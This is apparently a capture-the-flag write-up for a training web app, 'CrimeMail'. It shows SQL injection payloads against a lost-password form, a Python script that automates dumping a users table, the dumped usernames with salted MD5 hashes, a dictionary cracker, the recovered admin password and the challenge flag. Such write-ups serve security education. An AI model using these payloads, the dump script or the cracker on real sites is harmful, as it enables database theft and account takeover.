# CrimeMail

**Link**: [https://training04.webhack.it/](https://training04.webhack.it/)

**Hint**: his password's md5 is computed as followed: md5 = md5(password+salt) and Collins Hackle has a password which can be found in an **[english dictionary](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt)**
.

The webapp is vulnerable to `SQLi`. The main form is not vulnerable but the `Lost password` section it is, in `/forgot.php`.

Just use as username this payload: `' or 1=1 #`   and it returns this:

```bash
array(5) {
  [0]=>
  array(1) {
    ["hint"]=>
    NULL
  }
  [1]=>
  array(1) {
    ["hint"]=>
    NULL
  }
  [2]=>
  array(1) {
    ["hint"]=>
    NULL
  }
  [3]=>
  array(1) {
    ["hint"]=>
    NULL
  }
  [4]=>
  array(1) {
    ["hint"]=>
    string(27) "I don't need any hints man!"
  }
}
```

Then using `UNION` I got the database name:

```bash
**' or 1=1 UNION SELECT(SELECT database()) #**
```

It returns:

```bash
array(3) {
  [0]=>
  array(1) {
    ["hint"]=>
    NULL
  }
  [1]=>
  array(1) {
    ["hint"]=>
    string(27) "I don't need any hints man!"
  }
  [2]=>
  array(1) {
    ["hint"]=>
    string(2) "db"
  }
}
```

So the **database** name is `db`.

Then I tried to get the database schema:

```bash
' or 1=1 UNION SELECT(SELECT table_name from information_schema.tables WHERE table_schema="db") #
```

and it returns:

```bash
array(3) {
  [0]=>
  array(1) {
    ["hint"]=>
    NULL
  }
  [1]=>
  array(1) {
    ["hint"]=>
    string(27) "I don't need any hints man!"
  }
  [2]=>
  array(1) {
    ["hint"]=>
    string(5) "users"
  }
}
```

There is only one **table** called `users`.

Then I got users’s `column` names:

```bash
' or 1=1 UNION SELECT(SELECT column_name from information_schema.columns WHERE table_schema="db" AND table_name="users") #
```

this returns more then one row so I had to limit it using **limit** and **offset:**

```bash
' or 1=1 UNION SELECT(SELECT column_name from information_schema.columns WHERE table_schema="db" AND table_name="users" limit 0,1) #
```

this **SQLi** returns the first row (`limit 0,1`)

It returns:

```bash
array(3) {
  [0]=>
  array(1) {
    ["hint"]=>
    NULL
  }
  [1]=>
  array(1) {
    ["hint"]=>
    string(27) "I don't need any hints man!"
  }
  [2]=>
  array(1) {
    ["hint"]=>
    string(6) "userID"
  }
}
```

The **first** column is called `userID`.

I used this process to get all columns name: 

```json
userID
username
pass_md5
pass_salt
hint
```

Now let’s dump the db (somehow if I add `hint` to concat it won't work):

```json
' or 1=1 UNION SELECT(SELECT CONCAT(userID, " ", username, " ", pass_md5, " ", pass_salt)  from users limit 0,1) #
```

It returns:

```json
array(3) {
  [0]=>
  array(1) {
    ["hint"]=>
    NULL
  }
  [1]=>
  array(1) {
    ["hint"]=>
    string(27) "I don't need any hints man!"
  }
  [2]=>
  array(1) {
    ["hint"]=>
    string(49) "1 p.escobar c4598aadc36b55ba1a4f64f16e2b32f1 Jdhy"
  }
}
```

Then I automatized this process using `python`:

```python
import requests
import itertools
from bs4 import BeautifulSoup as BS
import re

challenge_auth_token=""
PHPSESSID=""
URL = "https://training04.webhack.it/hint.php"

session = requests.Session()
session.cookies.set("challenge_auth_token", challenge_auth_token)
session.cookies.set("PHPSESSID", PHPSESSID)

def make_request(params):
    global session
    return session.post(URL, data=params).text

def parse_response(text):
    soup = BS(text, "html.parser")
    try:
        query_results = soup.find("body").find("pre").get_text()
        re_pattern = r"\[2\].*\"(.*)\""
        matches = re.finditer(re_pattern, query_results, re.MULTILINE | re.DOTALL)
        for match in matches:
            return match.group(1)
    except Exception as e:
        return None

def main():
    users = []
    for i in itertools.count(start=0):
        params = {
            "username": f"' or 1=1 UNION SELECT(SELECT CONCAT(userID, \" \", username, \" \", pass_md5, \" \", pass_salt)  from users limit {i},1) #"
        }
        text = make_request(params)
        data = parse_response(text)
        if not data:
            break
        user = {
            "userID": data.split(" ")[0],
            "username": data.split(" ")[1],
            "pass_md5": data.split(" ")[2],
            "pass_salt": data.split(" ")[3]
        }
        users.append(user)
    print(users)

if __name__ == "__main__":
    main()
```

DB table users dump:

```json
[{'userID': '1', 'username': 'p.escobar', 'pass_md5': 'c4598aadc36b55ba1a4f64f16e2b32f1', 'pass_salt': 'Jdhy'}, {'userID': '2', 'username': 'g.dupuy', 'pass_md5': '0fd221fc1358c698ae5db16992703bcd', 'pass_salt': 'Kujh'}, {'userID': '3', 'username': 'a.capone', 'pass_md5': '23afc9d3a96e5c338f7ba7da4f8d59f8', 'pass_salt': 'hTjl'}, {'userID': '4', 'username': 'c.manson', 'pass_md5': 'fe3437f0308c444f0b536841131f5274', 'pass_salt': 'YbEr'}, {'userID': '5', 'username': 'c.hackle', 'pass_md5': 'f2b31b3a7a7c41093321d0c98c37f5ad', 'pass_salt': 'yhbG'}]
```

The `admin` user is `c.hackle` so now it is time to crack the password **hashed** (`md5`) and **salty**.

I created using python this `decryptor`:

```python
import hashlib
import json
from tqdm import tqdm

def decrypt(pass_md5, pass_salt):
    with open("./words_dictionary.json") as f:
        english_vocabulary = json.load(f)

    for word in tqdm(english_vocabulary.keys()):
        possible_psw = word+pass_salt
        result = hashlib.md5(possible_psw.encode())
        if result.hexdigest() == pass_md5:
            print("Password found: ", word)
            break

if __name__ == "__main__":
    decrypt("f2b31b3a7a7c41093321d0c98c37f5ad", "yhbG")
```

Clear password found: `pizza`

Then login in the form using the credentials `c.hackle:pizza`
Got the **flag**:  `WIT{8796fb6f729ad1927baf1a41804997ba}`